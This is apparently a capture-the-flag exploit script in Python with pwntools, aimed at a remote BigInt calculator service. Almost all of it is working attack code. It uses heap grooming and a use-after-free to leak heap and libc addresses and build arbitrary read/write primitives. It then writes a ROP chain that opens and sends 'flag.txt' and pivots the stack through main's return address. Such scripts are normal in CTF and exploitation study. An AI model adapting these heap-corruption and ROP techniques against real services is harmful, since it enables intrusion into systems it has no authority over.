#!/usr/bin/env python3
#
# @mebeim - 2025-05-21
#
import os
from pwn import context, log, remote


HOST = os.getenv('HOST', 'localhost')
PORT = int(os.getenv('PORT', 1337))


def to_bigint(data: list[int]) -> int:
	value = 0
	shift = 0

	for v in data:
		# Top nibble will be lost
		assert v < (1 << 60)
		value |= v << shift
		shift += 60

	return value


def fake_bigint(data_ptr: int, size: int) -> int:
	return to_bigint([1, data_ptr, data_ptr + size, data_ptr + size])


class Expl:
	def __init__(self, r: remote):
		self.remote = r

	def expr(self, s: str|bytes) -> bytes|None:
		if isinstance(s, str):
			s = s.encode()

		self.remote.sendlineafter(b'> ', s)
		if b'=' not in s:
			return self.remote.recvline()

		return None

	def arb_read(self, addr: int, n_longs: int=1) -> list[int]:
		sz = n_longs * 8

		self.expr('pwn')
		self.expr(f'pwn = {fake_bigint(addr, sz):x}')

		# Use expression to avoid free
		data = self.expr('v3 + 0')
		assert data is not None, f'Failed to read at {addr:#x}'

		value = int(data, 16)
		res = []

		for _ in range(n_longs):
			res.append(value & 0xfffffffffffffff)
			value >>= 60

		return res

	def arb_write(self, addr: int, data: list[int], assume_zero: bool=False):
		# Top 4 bits of each long will be discarded
		sz = len(data) * 8
		value = to_bigint(data)

		self.expr('pwn')
		self.expr(f'pwn = {fake_bigint(addr, sz):x}')

		if assume_zero:
			self.expr(f'v3 += {value:x}')
			return

		res = self.expr('v3 + 0')
		assert res is not None, f'Failed to read (before write) at {addr:#x}'

		# We can only do in-place add/sub (normal assign will copy)
		old = int(res, 16)
		if value > old:
			self.expr(f'v3 += {value - old:x}')
		elif value < old:
			self.expr(f'v3 -= {old - value:x}')

	def run(self) -> str:
		# These offsets shouldn't change (assuming the Docker image doesn't)
		HEAP_LEAK_OFF       = 0x15000
		SMALLBIN_HEAP_OFF   = 0x14c50
		FLAG_TXT_HEAP_OFF   = 0x15798
		CHAIN_HEAP_OFF      = 0x20000
		LIBC_MAIN_ARENA_OFF = 0x203b60
		LIBC_ENVIRON_OFF    = 0x20ad58

		# Allocate a bunch of vars for later
		for i in range(19):
			self.expr(f'v{i} = ff')

		# Alloc file name to open() later
		self.expr('flag = ffffff')

		# Fill tcache + put 10 in fastbin
		for i in range(7 + 10):
			self.expr(f'v{i}')

		# Consolidate, move fastbin to unsorted to have libc addr on heap for later
		self.expr('0' * 0x400)

		# Put 2 more in fastbins to leak heap
		self.expr('v17')
		self.expr('v18')

		res = self.expr('v17')
		assert res is not None, 'Failed to leak heap'

		heap = (abs(int(res, 16)) << 12) - HEAP_LEAK_OFF
		log.success('Heap: %#x', heap)

		# Reclaim free BigInt from tcache with newly allocated BigInt
		# std::vector backing store and craft fake std::vector for arbitrary
		# r/w primitive.
		#
		#  pwn BigInt                 Victim BigInt
		#  o-----------------o     -->o----------------------------o
		#  | sign_ = 1       |    /   | sign_ = 1                  |
		#  | data_.start     |---'    | data_.start     = ADDR     |
		#  | data_.end       |---.    | data_.end       = ADDR + 8 |
		#  | data_.alloc_end |----\   | data_.alloc_end = ADDR + 8 |
		#  o-----------------o     -->o----------------------------o

		# First alloc will reclaim v5 with pwn's std::vector backing store,
		# and subsequent ones will reclaim v3. Use v5 once to leak libc
		# main_arena.
		self.expr(f'pwn = {fake_bigint(heap + SMALLBIN_HEAP_OFF, 8):x}')
		data = self.expr('v5 + 0')
		assert data is not None, 'Failed to leak libc'

		libc = int(data, 16) - LIBC_MAIN_ARENA_OFF
		log.success('libc: %#x', libc)

		# Now we have a consistent arb r/w via UAF on v3
		environ = self.arb_read(libc + LIBC_ENVIRON_OFF)[0]
		main_retaddr = environ - 0x130
		log.success('environ: %#x', environ)
		log.success('main() retaddr @ %#x', main_retaddr)

		# Write chain on heap and pivot stack into it
		chain_addr = heap + CHAIN_HEAP_OFF
		log.info('Writing chain at %#x', chain_addr)

		# Simplest thing would be system("/bin/sh"), but this is cooler!
		self.arb_write(chain_addr, [
			# open("flag.txt", O_RDONLY, 0)
			libc + 0x10f75b         , # pop rdi ; ret
			heap + FLAG_TXT_HEAP_OFF,
			libc + 0x110a4d         , # pop rsi ; ret
			0x0                     ,
			libc + 0x0b5da0         , # xor edx, edx ; mov eax, edx ; ret
			libc + 0x0dd237         , # pop rax ; ret
			0x2                     ,
			libc + 0x13a1bb         , # syscall ; ret

			# sendfile(1, rax, NULL, 0x100)
			libc + 0x10f75b         , # pop rdi ; ret
			0x1                     ,
			libc + 0x138f2d         , # xchg esi, eax ; xor eax, eax ; ret
			libc + 0x0b5da0         , # xor edx, edx ; mov eax, edx ; ret
			libc + 0x0a876e         , # pop rcx ; ret
			0x100                   ,
			libc + 0x11bb84         , # mov r10, rcx ; mov eax, 0x28 ; syscall

			# exit(0)
			libc + 0x10f75b         , # pop rdi ; ret
			0x0                     ,
			libc + 0x0dd237         , # pop rax ; ret
			0x3c                    ,
			libc + 0x13a1bb         , # syscall ; ret
		], assume_zero=True)

		self.arb_write(main_retaddr, [
			libc + 0x3c058, # pop rsp; ret
			chain_addr
		])

		# Error out to return from main
		self.remote.sendline(b'gg')
		self.remote.recvuntil(b'Invalid value\n')

		flag = self.remote.clean()
		return flag.strip().decode()


def main() -> int|str:
	context(arch='amd64')

	for _ in range(10):
		r = remote(HOST, PORT)

		try:
			flag = Expl(r).run()
			break
		except EOFError:
			log.failure('EOFError, retrying...')
		except AssertionError:
			log.failure('AssertionError, retrying...')

		r.close()
	else:
		return 'Failed to run exploit, exceeded 100 attempts!'

	print(flag)
	return 0


if __name__ == '__main__':
	main()
